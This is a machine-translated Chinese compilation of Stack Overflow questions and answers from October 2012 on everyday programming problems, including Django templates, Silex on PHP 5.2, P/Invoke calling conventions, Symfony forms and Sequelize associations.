# StackOverflow 问答 13125000-13125999

# tridion - 动态组件演示中的 UGC？

> ID：13125000
> 
> 赞同：1
> 
> 时间：2012-10-29T15:48:16.403
> 
> 标签：tridion, tridion-2011, tridion-content-delivery, ugc

我在将 UGC 框架与动态组件演示结合使用时遇到问题。

当我将 CP 发布为“嵌入页面”时，我的 UGC 标签会很好地转换为，并且我可以留下评分等。但是，如果我创建同一 CT/CP 的动态版本，则会部署到代理, 是相同的组件表示，去掉了。

这里是否有我不知道的限制，或者可能缺少一些配置？

任何想法都会非常受欢迎。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-29T16:18:41.590

我认为您需要检查 Dynamic CT 的输出格式 - 确保将其设置为与您的目标（REL、ASP.NET、JSP 等）相同，而不是设置为 None 或 HTML

# html - 如何从html源代码中删除空格

> ID：13125006
> 
> 赞同：30
> 
> 时间：2012-10-29T15:48:50.597
> 
> 标签：html, django

我正在使用 django 和 python。在模板文件中，我有一个如下所示的下拉列表。有用。唯一的问题是源 html 代码之间有很多空白。有什么办法可以去掉空白吗？谢谢。

```
 {% for lang_ele in video.languages.all %}
              {% ifequal lang_ele.lang display_language  %}
                   {% for key, value in language_table.items %}
                       {% ifequal lang_ele.lang key%}
                         <option selected = "selected" value={{lang_ele.lang}}>{{value}}</option>
                       {% endifequal %}
                   {% endfor %}
              {% else %}
                   {% for key, value in language_table.items %}
                       {% ifequal lang_ele.lang key%}
                         <option value={{lang_ele.lang}}>{{value}}</option>
                       {% endifequal %}
                   {% endfor %}

              {% endifequal %}
           {% endfor %} 
```

输出的 html 源代码如下所示：

```
<option value=de>German</option> 

<option value=el>Greek</option> 

<option value=hi>Hindi</option> 
```

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2012-10-29T15:55:40.817

您可以使用[`spaceless`](https://docs.djangoproject.com/en/dev/ref/templates/builtins/?from=olddocs#spaceless)模板标签。它：

> 删除HTML 标记**之间的空格。**

```
{% spaceless %}
<p>
    <a href="foo/">Foo</a>
</p>
{% endspaceless %} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-29T20:07:07.270

1.  查看中间件，例如“htmlmin”。它一次处理文件。此外，它还有一个装饰器。 [https://crate.io/packages/django-htmlmin](https://crate.io/packages/django-htmlmin)

2.  gzip 将产生相同的效果。选择不进行修剪可能需要付出代价。查看 django middelware 或 nginx gzip。

    *   django.middleware.gzip.GZipMiddleware
    *   [http://wiki.nginx.org/HttpGzipModule](http://wiki.nginx.org/HttpGzipModule)
3.  您在模板中使用控制器/模型逻辑。这是错误的方式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T15:55:31.597

我使用自定义辅助函数进行剥离。这是我也使用的一个示例：[https ://web.archive.org/web/20140729182917/http://cramer.io/2008/12/01/spaceless-html-in-django/](https://web.archive.org/web/20140729182917/http://cramer.io/2008/12/01/spaceless-html-in-django/)

# namespaces - 输入中的意外字符：Silex 应用程序中的 '\' (ASCII=92) state=1

> ID：13125007
> 
> 赞同：13
> 
> 时间：2012-10-29T15:49:02.553
> 
> 标签：namespaces, autoload, silex, php

我将我的网站从本地移动到主机，但发生了一些事情。我将此配置文件包含在我`index.php`的（这是我做的第一件事）中：

```
<?php
require_once __DIR__.'/../../vendor/autoload.php';

// some other stuff

$app = new Silex\Application();
$app['debug'] = true;

$defaultLocale = 'en';

$app->register(new Silex\Provider\TwigServiceProvider(), array(
    'twig.path' => array(
                            __DIR__.'/../views', 
                            __DIR__.'/../views/backend', 
                            __DIR__.'/../views/layouts',
                            __DIR__.'/../views/components',
                            __DIR__.'/../views/backend/components', 
                        ),
));
$app->register(new Nicl\Silex\MarkdownServiceProvider()); 
```

但是该网站以这种方式抱怨：

> **警告**：输入中的意外字符：第 7 行 /public_html/_inc/config.php 中的 '\' (ASCII=92) state=1
> 
> **解析错误**：语法错误，第 7 行 /public_html/_inc/config.php 中的意外 T_STRING

基本上，第 7 行是`$app = new Silex\Application();`. 我正在使用 Silex，服务器正在运行 PHP 5.2。供应商文件夹（包含所有框架和第三方内容）位于根目录 ( `/`)

我想知道它在自动加载方面有一些问题，但我不知道究竟是什么或如何测试它。你觉得有什么奇怪的吗？提前致谢。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-10-29T15:51:32.443

根据[官方文档](http://silex.sensiolabs.org/doc/intro.html)，Silex 需要**PHP 5.3**来提供命名空间支持。
尝试将您的服务器迁移到 PHP 5.3 以消除此错误。

> Silex 是 PHP 5.3 的 PHP 微框架。

# c++ - 如何在 Qt gui 应用程序中使用 QDwm

> ID：13125011
> 
> 赞同：0
> 
> 时间：2012-10-29T15:49:11.370
> 
> 标签：c++, qt, aero-glass

如何使用 QDwm 扩展 qt 窗口中的航空玻璃？我没有找到任何有关如何执行此操作的文档。链接：http: [//sourceforge.net/projects/qdwm/](http://sourceforge.net/projects/qdwm/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:17:27.777

下载源代码并查看 QCustomWindow.hh。只有 10 个方法和一个构造函数。您应该能够通过查看它们的标题来了解这些方法的作用。他们来了：

```
// constructor
QCustomWindow(QWidget* parent = 0, Qt::WindowFlags flags = Qt::Window);

// setters
void setFrameRemoved(bool isRemoved);
void setExtraMargins(const QMargins& margins);
void setBorderSize(int size);
void setTitleBarSize(int size);

// getters
bool isFrameRemoved(void) const;
QMargins extraMargins(void) const;
int borderSize(void) const;
int titleBarSize(void) const;

static bool isAeroActivated(void);
static bool isThemeActivated(void); 
```

# iphone - Iphone4“添加到主屏幕”即时启动

> ID：13125013
> 
> 赞同：0
> 
> 时间：2012-10-29T15:49:27.657
> 
> 标签：iphone, performance, html

如何让 Web 应用程序立即启动 - 是否可以像已经加载的本机应用程序一样快？

我开发了一个 HTML5 网络应用程序，它在 Iphone 4 上运行良好，带有启动画面。但现在我正在研究性能：

我使用清单文件来确保所有文件都是从本地存储加载的。我已经在 chrome 和 mobile safari 中检查了文件是否正确存储在本地。现在根据我访问我的网络应用程序的方式，它的性能完全不同：

~4s 当我在浏览器中加载网络应用程序时（不是从主屏幕图标）。~6s 当我从“添加到主屏幕”图标加载时

当我在 chrome 浏览器中加载时，加载和渲染整个页面需要 234 毫秒。我似乎缺乏速度是由于渲染速度很慢。

非常欢迎任何性能建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-07-09T16:11:09.377

我从经验中知道，Chrome 应用程序所有以前的版本/更新都留在其应用程序中的 MacOSX 设备。这可能也适用于 ios，因为它是 MacOSX 系统的剥离版本。

从您的 iPhone 中删除 Chrome 应用程序并从 App Store 重新安装它可能会有所帮助。这样，您可以确保您在 iPhone 上拥有一个干净的 Chrome 副本，而没有所有以前的 Chrome 版本。

我希望这有帮助。

# xna - 在 XNA 2D 碰撞检测中，绘制纹理的原点是否在其中？

> ID：13125014
> 
> 赞同：0
> 
> 时间：2012-10-29T15:49:27.960
> 
> 标签：xna, collision

在制作矩形进行碰撞（相交）检测时，我似乎无法判断是否应该考虑绘制纹理的原点。我见过的大多数示例在绘制时都使用原点 X/2、Y/2，但是在创建用于检测碰撞的位置的矩形时它们并没有做任何特别的事情。我正在试验它，但还没有得出任何具体的结论，尤其是对于小物体。感谢您的关注！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:03:17.590

根据我自己的经验，在考虑缩放和旋转等线性变换时，四边形的原点会考虑在内。这可能对您从四边形生成的边界正方形产生直接影响，因为它也会影响边界正方形变换。

重要的是要确保它们都对齐，以便一个变换正确地从一个正方形映射到另一个正方形。所以我要做的是确保边界正方形的原点映射到四边形。

就个人而言，我只是使用从四边形中心计算的四边形边界空间并在这些范围内测试 AABB 碰撞。显然，您需要根据对象与中心的距离来设计范围。

# signalr - Windows 应用程序中的 SignalR

> ID：13125019
> 
> 赞同：0
> 
> 时间：2012-10-29T15:49:38.327
> 
> 标签：signalr, signalr-hub, signalr.client

请，任何人都可以展示一个如何在 Windows 应用程序中实现 signalR 的示例。我需要在服务器端启动时显示一个消息框

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T07:20:52.093

连接的开始方法是一个异步方法。您必须调用 Task 类的 ConinueWith 方法。

```
var connection = new HubConnection("http://localhost:port-no");
IHubProxy hub = connection.CreateProxy("hub-name");
connection.Start().ContinueWith((t) => { MessageBox.Show("Your-message"); }); 
```

# html - Mailchimp 电子邮件中的编码问题

> ID：13125021
> 
> 赞同：4
> 
> 时间：2012-10-29T15:49:45.077
> 
> 标签：html, encoding, utf-8, gmail, mailchimp

我为我工作的公司的电子邮件通讯创建了一个 Mailchimp 模板。某些链接存在问题，我不知道如何修复它们。

我在电子邮件中添加一个链接，如下所示：

```
<a href="http://www.nameofcompany.com/contact-us.php" target="_blank">Contact Us</a> 
```

该链接看起来很好，但是当在 Gmail 中单击时，它会将您带到该站点的 404 页面，即使该 URL（表面上）是正确的。

点击链接后，地址栏中显示的 URL 为[http://www.nameofcompany.com/contact-us.php](http://www.nameofcompany.com/contact-us.php)，这是正确的 URL，在地址栏中输入时直接进入正确的页面。但是，当我从电子邮件中访问此 URL，然后将其从地址栏中复制并粘贴到 Gmail 中的新电子邮件中时，我看到： http: [//www.nameofcompany.com/contact%E2%80%90us.php](http://www.nameofcompany.com/contact%E2%80%90us.php)

所以这似乎是字符编码的问题。我不知道如何解决它。

这是电子邮件 HTML 中的文档类型、字符集等。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
```

最奇怪的是，电子邮件中的大多数 URL 都可以正常工作，即使是带有破折号的 URL。

是什么导致了这个问题，我该如何解决？

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T17:58:38.967

好的，修好了。我在 Mailchimp 上找到了模板，并使用“编辑此模板的代码”在我的浏览器中编辑 HTML。然后我找到了导致问题的标签，将其删除并再次输入。有点粗略的修复，我不确定为什么最初会出现问题，但它完成了工作！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T17:18:59.760

E2 80 90 是多字节连字符的 Unicode 字节序列，您应该使用 ASCII 字节序列。哪个应用。你用编码你的html文件吗？这与连字符的编码有关。如果您在代码编辑器（例如 Courier）中获得此类选项，请尝试使用简单的文本字体。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T17:55:12.867

我不知道为什么连字符在这里被编码为 3 个字节 - 通常 URL 中的非字母/数字字符被编码为一个字节。

尝试用 %2D 替换连字符，这样连字符就不会转换为 %E2%80%90。

# php - symfony2 表单隐藏行

> ID：13125022
> 
> 赞同：1
> 
> 时间：2012-10-29T15:49:45.483
> 
> 标签：php, symfony

我正在尝试将两个隐藏字段放入特定用户的表单中。我有这个代码：

```
<div id="mio_miobundle_empleadotype">
{{ form_row(edit_form.dni) }}
{{ form_row(edit_form.nombre) }}
{{ form_row(edit_form.username) }}
{{ form_row(edit_form.apellido1) }}
{{ form_row(edit_form.apellido2) }}
{{ form_row(edit_form.localidad) }}
{{ form_row(edit_form.provincia) }}
{{ form_row(edit_form.telefono) }}
{{ form_row(edit_form.movil) }}
{{ form_row(edit_form.email) }}
{{ form_row(edit_form.direccion) }}
{% if is_granted('ROLE_A') %}     
      {{ form_row(edit_form.activo) }}
      {{ form_row(edit_form.role) }}
{%endif%}
{{ form_row(edit_form.password) }} 
```

和：

```
$builder
            ->add('dni','text',array('label' => 'Dni'))
            ->add('nombre','text',array('label' => 'Nombre'))
            ->add('username','text',array('label' => 'Usuario'))
            ->add('apellido1','text',array('label' => 'Apellido1'))
            ->add('apellido2','text',array('label' => 'Apellido2'))
            ->add('email','email',array('label' => 'Email'))
            ->add('localidad','text',array('label' => 'Localidad'))
            ->add('provincia','text',array('label' => 'Provincia'))
            ->add('telefono','text',array('label' => 'Teléfono'))
            ->add('movil','text',array('label' => 'Móvil'))
            ->add('direccion','text',array('label' => 'Dirección'))
            ->add('activo')
            ->add('role')
            ->add('password', 'repeated', array('first_name' => 'Nueva contraseña','second_name' => 'Repite contraseña','type' => 'password' ,'invalid_message'=> 'Las contraseñas deben ser iguales.'))
        ;
    } 
```

但我收到此错误：

> 可捕获的致命错误：传递给的参数 1`mio\mioBundle\Entity\Empleado::setRole()`必须是给定的实例`mio\mioBundle\Entity\Role`，`null`在 /var/www/Symfony/vendor/symfony/src/Symfony/Component/Form/Util/PropertyPath.php 第 347 行调用并在 /var 中定义/www/Symfony/src/mio/mioBundle/Entity/Empleado.php 第 289 行

我说是因为我要填写状态有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T17:30:04.797

将检查角色代码放在控制器中

```
public function someAction()
{
    $form = $this->createFrom( // ...
    if (false === $this->get('security.context')->isGranted('ROLE_A')) {
        $form->remove('activo');
        $form->remove('role');
    }

    // ...
} 
```

并在模板中检查是否定义了表单字段

```
{{ edit_form.activo is defined ? form_row(edit_form.activo) : '' }}
{{ edit_form.role is defined ? form_row(edit_form.role) : '' }} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-29T16:52:43.087

与其不完全渲染字段，不如尝试使用 css 从视图中隐藏字段。

```
{% if is_granted('ROLE_A') %}     
      {{ form_row(edit_form.activo) }}
      {{ form_row(edit_form.role) }}
{% else %}
      {{ form_widget(edit_form.activo, { 'attr': {'class': 'hide'} }) }}
      {{ form_widget(edit_form.role, { 'attr': {'class': 'hide'} }) }}
{% endif %} 
```

# c# - 使用 C++ 代码的 Visual C# 中的 Pinvoke 问题

> ID：13125027
> 
> 赞同：3
> 
> 时间：2012-10-29T15:50:09.700
> 
> 标签：c#, visual-studio-2010, visual-c++, kinect, 3d-reconstruction

我正在尝试编写reconstructMe SDK的“一分钟”示例，但是我认为他们的SDK是用c ++编写的，我按照他们的页面（[此处](http://reconstructme.net/wp-content/uploads/ReconstructMe/1.2/doc/html/_getting_started_page.html#OneMinuteExample)）的指示成功创建了一个控制台应用程序，但我想创建一个简单的用户界面，但是我对 Visual c++ 不是很熟悉（我确实对 c++ 有所了解），所以我尝试了他们的 C# 示例（我对他们的 UI 设计非常熟悉）但是在使用提供的 C# 代码时出现此错误（[这里](http://reconstructme.net/wp-content/uploads/ReconstructMe/1.1/doc/html/example_reconstructmesdk_one_minute_8cs-example.html)）：

> 调用 PInvoke 函数 'Lala!Lala.Reme::reme_context_compile' 使堆栈失衡。这可能是因为托管 PInvoke 签名与非托管目标签名不匹配。检查 PInvoke 签名的调用约定和参数是否与目标非托管签名匹配。

我认为是配置项目或类似的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:14:05.163

rebuildMe DLL 使用 C[调用约定](http://en.wikipedia.org/wiki/Calling_convention)( `Cdecl`) 而不是 Windows 调用约定 ( `StdCall`)。它们在处理堆栈的方式上有所不同，这就是为什么不正确的调用约定会导致堆栈不平衡的原因。

p/Invoke 的默认值为`StdCall`，您需要手动将[CallingConvension](http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.callingconvention.aspx)参数设置`Cdecl`为`DllImport`属性：

```
[DllImport("example.dll", CallingConvention=CallingConvention.Cdecl)]
public static extern int function(int param); 
```

# java - 如何使用 ACRA 记录所有线程的堆栈跟踪

> ID：13125028
> 
> 赞同：0
> 
> 时间：2012-10-29T15:50:09.763
> 
> 标签：java, android, multithreading, crash-reports, acra

大家！

现在我正在尝试使用 ACRA 在我的电子邮件中发送崩溃报告。我有下一个 ACRA 设置：

```
@ReportsCrashes(
formKey = "",
mailTo = "developer@email.com",
additionalSharedPreferences = {
    CSConfig.pref.PREFERENCES
},
customReportContent = {
    ReportField.PHONE_MODEL,
    ReportField.ANDROID_VERSION,
    ReportField.APP_VERSION_NAME,
    ReportField.APP_VERSION_CODE,
    ReportField.STACK_TRACE,
    ReportField.AVAILABLE_MEM_SIZE,
    ReportField.SHARED_PREFERENCES,
    ReportField.LOGCAT
},
mode = ReportingInteractionMode.TOAST,
resToastText = R.string.crash_toast_msg 
```

)

问题是：如何告诉 ACRA 将所有正在运行的线程（如调试中）的堆栈跟踪发送给我？

谢谢！我将非常感谢您的回答！

# network-programming - 网络接口和 IFF_XX 标志

> ID：13125029
> 
> 赞同：2
> 
> 时间：2012-10-29T15:50:11.690
> 
> 标签：network-programming, linux-kernel, linux-device-driver

我想了解在内核中创建网络接口和初始化接口标志（例如 IFF_UP 或 IFF_MULTICAST 等）时，内核编程中是否设置了任何约定。必须至少配置哪些标志 - 对此有任何要求?

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T15:52:46.987

`Standard interface flags`在[include/linux/if.h](http://lxr.free-electrons.com/source/include/linux/if.h#L30)中有描述。

详情见评论。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-04-21T09:41:09.150

查看[http://man7.org/linux/man-pages/man7/netdevice.7.html](http://man7.org/linux/man-pages/man7/netdevice.7.html)，这是 NETDEVICE(7) 的手册页。在那里，您将看到 SIOCSIFFLAGS 和 SIOCCIFFLAGS 下的标志列表。

# ruby-on-rails-3 - Rails 命名空间模型自动加载问题？

> ID：13125036
> 
> 赞同：2
> 
> 时间：2012-10-29T15:50:22.580
> 
> 标签：ruby-on-rails-3, activerecord, namespaces, autoload

这是设置：

```
class Project < ActiveRecord::Base
  has_many :project_subject_areas, class_name: "Project::SubjectArea"
  has_many :subject_areas, through: :project_subject_areas
end

class SubjectArea < ActiveRecord::Base
  has_many :project_subject_areas, class_name: "Project::SubjectArea"
  has_many :projects, through: :project_subject_areas
end

class Project::SubjectArea < ActiveRecord::Base
  belongs_to :project
  belongs_to :subject_area, class_name: '::SubjectArea'
end 
```

在 Rails 中运行：

```
[ SubjectArea.to_s, Project::SubjectArea.to_s ].inspect 
```

给出：

```
["SubjectArea", "SubjectArea"] 
```

但运行这个（服务器重启后）：

```
[ Project::SubjectArea.to_s, SubjectArea.to_s ].inspect 
```

给出：

```
["Project::SubjectArea", "SubjectArea"] 
```

文件结构为：

```
models/project.rb
models/subject_area.rb
models/project/subject_area.rb 
```

我可以`require project/subject_area`手动绕过它，但是我对这个命名空间做错了吗？

还有其他方法可以命名我的模型吗？

当 Rails 生成命名空间时`rails generate Project::X`，我将 Project 作为一个模块，但我需要它是一个 ActiveRecord 类。我还有一些属于 Project 的其他模型，我真的希望它们被命名空间并位于 models/project/ 目录中。

# java - 使用 Java 处理表单数据

> ID：13125038
> 
> 赞同：2
> 
> 时间：2012-10-29T15:50:28.950
> 
> 标签：java, mysql, forms, servlets

我目前正在开发一个 Java Web 应用程序，它将获取用户提交的数据（来自表单）并将其写入数据库。输入页面是一个 JSP 文件，其中包含许多文本框、下拉列表、文本区域等。我想知道如何处理表单中的数据并将其放入数据库中，当表单可能具有可变数量的输入时。

我会给你一个例子来说明我的问题：一个用户有多个电话号码，他们想给我们。在表单上，​​有一个电话号码输入框，以及一个“添加”按钮，它使用 JQuery 添加另一个电话号码输入框。当用户提交表单时，servlet 接收所有数据。在这一点上，处理这些数据以便我可以将其添加到数据库中的最可靠的方法是什么？我的第一个想法是让 javascript 增加电话号码框的名称（例如：“phonenumber1”、“phonenumber2”等）并让 servlet 循环通过输入，但似乎它们应该是一种更健壮的方式去做吧。我真的很感激我能得到的任何建议。谢谢！

编辑：拼写

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:37:16.223

```
request.getParameterNames();--phonenumber1,2,3 
```

它将返回所有参数名称

并一一迭代枚举并得到这样的

```
request.getParameter(phonenumber1);--insert into DB 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T17:15:33.010

我会使用以下内容：

```
String[] phonenumbers = request.getParameterValues("phonenumber") 
```

请参阅[javadoc](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletRequest.html#getParameterValues%28java.lang.String%29)。它将返回给您一个包含表单中所有名为“phonenumber”的字段的数组。您最终可以循环阵列并将其存储到您的数据库中。

# jquery - 如何在链接下方滑动切换（或在链接下方显示/隐藏）？

> ID：13125039
> 
> 赞同：1
> 
> 时间：2012-10-29T15:50:34.360
> 
> 标签：jquery, jquery-plugins

> **可能重复：**
> [在同一地点显示/隐藏跨度](https://stackoverflow.com/questions/13124300/show-hide-span-on-the-same-spot)

请查看我正在设计的这个网页：http: [//www.mapisms.seas.gwu.edu/2.php](http://www.mapisms.seas.gwu.edu/2.php)

这里我有两个链接，当我单击每个链接时，span 标签出现在屏幕的左侧。但我希望他们每个人都出现在各自的链接下方。

```
<script type="text/javascript">
$(document).ready(function(){
    $(".slidingDiv").hide();
    $(".show_hide").show();

    $('.show_hide').click(function(){
    $(".slidingDiv").slideToggle();
    return false;
    });

    $(".slidingDiv1").hide();
    $(".show_hide1").show();

    $('.show_hide1').click(function(){
    $(".slidingDiv1").slideToggle();
    return false;
    });

});
</script> 
```

标签是：

```
<a href="#" class="show_hide">Japan</a><span class="slidingDiv"><img src="02-1 ImageFiles/01 Japan.JPG" style="width:235px; height:245px;" /><a href="#" class="show_hide">Close</a></span> is made up of islands, regions, prefectures (government districts), cities, and surrounding communities. The main island, Honshu, has thirty-four prefectures making up five regions. The <a class="show_hide1" href="#">Tōhoku Region</a><span class="slidingDiv1"><img src="02-1 ImageFiles/02 TohokuRegion.JPG" style="width:217px; height:236px;" /><a href="#" class="show_hide1">Close</a></span> 
```

# c# - 哪个 dataGridView 事件应该用于在编辑文本框后立即更改它的内容？

> ID：13125041
> 
> 赞同：2
> 
> 时间：2012-10-29T15:50:42.903
> 
> 标签：c#

我有一个带有 2 列的 gridview，一个是名为“choose”的 DataGridViewCheckBoxColumn，另一个是一个名为“ID”的普通 DataGridViewTextBoxColumn...我想在检查 chechkbox 列更改时立即更改文本框的文本... .但我不知道我应该使用哪个事件....

```
 void SetTextBox()
     { 
         TextBox1.Text="";
         for (int i = 0; i < MyGrid.Rows.Count; i++)
            if (Convert.ToBoolean(MyGrid.Rows[i].Cells["choose"].Value) == true)
            {                    
                TextBox1.Text += MyGrid.Rows[i].Cells["ID"].Value.ToString()+",";                   
            }
     }

     private void !!!!which Event?!!!!(object sender, EventArgs e)
     {
          SetTextBox();
     } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:00:02.877

实际上，您需要处理两个事件。这是一个改编自我现在正在处理的代码的示例。

```
 private void dgvRMADetail_CurrentCellDirtyStateChanged(object sender, EventArgs e)
    {
        if (dgvRMADetail.CurrentCell is DataGridViewCheckBoxCell))
        {
            dgvRMADetail.CommitEdit(DataGridViewDataErrorContexts.Commit);
        }
    }

    private void dgvRMADetail_CellValueChanged(object sender, DataGridViewCellEventArgs e)
    {
        if (e.ColumnIndex == useRowCheckboxColumn.Index)
        {
           // Logic for doing whatever when the checkbox is checked.
        }
    } 
```

第一个事件告诉它“当它改变时自动提交”，第二个事件是“当值被提交时，做某事”。

# c# - 传递带有变量值的自定义属性作为参数

> ID：13125046
> 
> 赞同：14
> 
> 时间：2012-10-29T15:51:00.020
> 
> 标签：c#, attributes

我创建了一个自定义属性类，它将检查系统安全性并在出现安全错误时引发身份验证异常。

```
public class EntityChecker: System.Attribute
{
    public EntityChecker(int entityId)
    {
        // doing some logic to check if the entityId is allowed to be inserted
    }
} 
```

我想将此自定义属性用作实体添加函数的声明，并且我想将一个变量从函数传递给属性构造函数。可以做这样的事情吗？

```
[EntityChecker(entityId)]
public int AddNewEntity(entityId)
{
 // logic of entity addition
} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-29T15:52:51.990

> 这样的事情能做到吗？！

不可以。属性中的构造函数参数必须*在编译时*解析。它们旨在作为*类型或方法本身*的元数据，而不是每次调用或每个实例都会使用的东西。

根据您的描述，属性可能不是处理此问题的合适方法。由于您想运行每次调用都会发生的额外代码，因此您将需要一种不同的技术。例如，您可以传递一个委托，即：

```
public int CheckedAddEntity(int entityId, Func<int, int> funcToAdd)
{
    // Perform your checking on entityId here
    return funcToAdd();
} 
```

这将使您可以通过以下方式调用：

```
int result = CheckedAddEntity(entityId, AddNewEntity); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:13:41.580

在这种情况下，我建议查看面向方面的编程。这是一种不同的代码编写方式，但它允许您在整个过程中重用样板逻辑（例如身份验证）。您可能需要稍微不同地设计您的属性，但所有逻辑都可以放入一个“方面”，然后在您构建项目时自动编译到代码中。

我个人使用 PostSharp，尽管我知道还有其他人。他们有可用于开发的免费许可证；只要您不需要高级功能，它就非常划算。

[http://www.postsharp.net/blog/post/5-Ways-That-Postsharp-Can-SOLIDify-Your-Code-Authorization](http://www.postsharp.net/blog/post/5-Ways-That-Postsharp-Can-SOLIDify-Your-Code-Authorization)

# ruby-on-rails-3 - 轮胎和弹性搜索 - 对象关联

> ID：13125047
> 
> 赞同：1
> 
> 时间：2012-10-29T15:51:00.010
> 
> 标签：ruby-on-rails-3, full-text-search, elasticsearch, tire

我在使用轮胎和弹性搜索功能时遇到了一点困难。

我有一个具有属性的列表。我正在尝试使基本搜索表单正常工作，以便可以从该属性创建查询。

```
# listings/index.html.erb

<%= form_tag searches_listings_path, method: :get do %>
  <p>
    <%= text_field_tag :query, params[:query] %>
    <%= text_field_tag :property_postcode, params[:property_postcode] %>
    <%= submit_tag "Search", name: nil %>
  </p>
<% end %> 
```

目前，每当我尝试过滤搜索结果时，似乎 property_postcode 被忽略并且所有结果都被返回。

```
 # Listing.rb
include Tire::Model::Search
      include Tire::Model::Callbacks

  mapping do
    indexes :id, type: 'integer'
    indexes :title, boost: 10
    indexes :description, analyzer: 'snowball'
    indexes :posted_at, type: 'date'
    indexes :property do
      indexes :postcode, :type => 'string'
    end
  end

  def self.search(params)

    tire.search(page: params[:page], per_page: 5, load: true) do
      query do
        boolean do
          must { string params[:query], default_operator: "AND" } if params[:query].present?
          must { term "property.postcode", params[:property_postcode] } if params[:property_postcode].present?
        end
      end
        end
      end

   def to_indexed_json
    to_json(:include => { 
              :property => {
                :only => [:postcode]
              }
            })
    end 
```

最后是财产

```
#Property.rb
class Property < ActiveRecord::Base
  belongs_to  :listing, touch: true
  after_touch() { tire.update_index }
end 
```

然后终于

```
rake environment tire:import CLASS=Listing FORCE=true 
```

提前致谢，

瑞安

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T18:59:11.157

```
Property.search(page: params[:page], per_page: 5, load: true) do
    query { string params[:query], default_operator => "AND" } if params[:query].present?
    filter :term, "property.postcode" => params[:property_postcode]  if params[:property_postcode].present?
end 
```

一定要在你的映射中打开路由

```
mapping :_routing => { :required => true, :path => property.postcode  } do 
```

# javascript - 控制 Adob e Reader 插件

> ID：13125048
> 
> 赞同：4
> 
> 时间：2012-10-29T15:51:00.190
> 
> 标签：javascript, pdf, plugins, web, adobe-reader

有什么方法可以控制网站上的 adobe reader pdf 插件，而不是简单地传递那些一旦加载文档就无法再影响的“开放参数”？

谢谢！

狮子座

# node.js - 对 Sequelize 关联感到困惑

> ID：13125050
> 
> 赞同：2
> 
> 时间：2012-10-29T15:51:11.173
> 
> 标签：node.js, database-design, sequelize.js

我刚刚发现 Sequelize 是一个很好的 ORM 框架，可以在我的 node + MySQL webapp 中使用。但是当我设计我的数据库表时，我对 Sequelize 关联感到非常困惑。

只需将 webapp 中的用户和系统通知视为一个非常简单的案例：

*   该网站有很多用户
*   该网站会向部分或所有用户发送通知，并且相同的通知只是保存为一条记录
*   用户可以知道他/她收到的任何通知是否已阅读（按阅读日期）

然后我按预期设计了3个表：

1.  `User`: `id`,`name`
2.  `Notification`: `id`, `title`, `content`,`sendAt`
3.  `Notify`: `id`, `UserId`(作为接收者), `NotificationId`,`readAt`

我可以通过 Sequelize简单地定义`User`和建模。`Notification`但我只是不知道如何使用关联来`Notify`通过外键`UserId`和`NotificationId`.

我曾尝试使用`hasOne`这样的关联：

```
Notify.hasOne(User);
Notify.hasOne(Notification); 
```

然后在两个表中都有一个`NotifyId`列。这不是我所期望的。也许我认为使用关联的方式错误，所以我想知道如何正确使用它？`User``Notification`

此外，如果我想获得 JSON 格式的结果：

```
[
    {id: 123, user: [Object some user], notification: [Object some notification], readAt: null},
    {id: 124, user: [Object another user], notification: [Object some notification], readAt: "Mon Oct 29 2012 20:44:54 GMT+0800"}
] 
```

如何`find`像以前使用的 SQL 一样只使用一次方法查询：

```
SELECT
    Notify.id as 'Notify.id',
    User.name as 'User.name',
    Notification.title as 'Notification.title',
    Notification.sendAt as 'Notification.sendAt',
    Notify.readAt as 'Notify.readAt'
FROM User, Notification, Notify
WHERE
    Notify.UserId = User.id AND
    Notify.NotificationId = Notification.id; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-21T09:15:54.713

我找到了正确的方法。我意识到我的 Notify 表是一个完整的表，因为它包含一`readAt`列。所以关联应该定义为：

```
Notification.hasMany(db.Notify);
User.hasMany(db.Notify); 
```

然后一切都好起来了。

第二个问题`find`也解决了。像这样使用：

```
Notify.findAll({
    include: ['User', 'Notification']
}).success(function (notify) {
    console.log(notify.user);
    console.log(notify.notification);
}); 
```

# jsf - 使用 ajax 的单页应用程序

> ID：13125055
> 
> 赞同：2
> 
> 时间：2012-10-29T15:51:21.350
> 
> 标签：jsf, jsf-2

我对 JSF 比较陌生，并试图了解当前的 JSF 2 应用程序是如何设计的。我见过对使用 ajax 的单页应用程序的引用。有人可以向我介绍一些使用的技术和/或指向我的模型或书籍吗？我看过的书（JSF Complete Reference 等）对基本技术问题很有帮助，但我找不到当前设计技术的来源。

谢谢戴夫

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-03-30T05:04:47.610

